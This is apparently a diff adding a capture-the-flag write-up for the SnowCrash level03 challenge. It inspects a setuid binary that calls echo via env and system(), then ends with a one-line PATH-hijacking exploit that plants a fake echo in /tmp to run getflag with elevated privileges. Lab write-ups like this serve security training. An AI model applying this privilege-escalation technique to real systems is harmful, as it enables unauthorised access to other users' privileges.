@@ -1,0 +1,41 @@
+
+level03@SnowCrash:~$ ls -la level03
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+we can see that the exe has special permission. the user level03 and flag03 are in the same group
+
+https://www.linuxaddict.fr/index.php/2018/06/04/les-droits-speciaux-sous-gnu-linux-setuid-setgid-sticky-bit-et-umask/
+https://fr.wikipedia.org/wiki/Setuid
+
+
+in the same time we have withe nm level03 
+[
+         U getegid@@GLIBC_2.0
+         U geteuid@@GLIBC_2.0
+080484a4 T main
+         U setresgid@@GLIBC_2.0
+         U setresuid@@GLIBC_2.0
+         U system@@GLIBC_2.0
+]
+
+that most importante here is the manipulation of the uid value,
+that let user change his uid and probably take the uid of the creator of the file
+read article :
+https://lea-linux.org/documentations/Dev-suid_scripts
+
+
+hexdump -C level03
+000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
+000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me
+
+we can see that the programe is printing text using the echo 
+so we can override the PATH variable to point to a directory with our custom version of echo
+and since echo is executed using env, it isn't treated as a built-in
+
+https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
+
+
+so
+
+echo '/bin/getflag' >> /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp/ ; ./level03
+
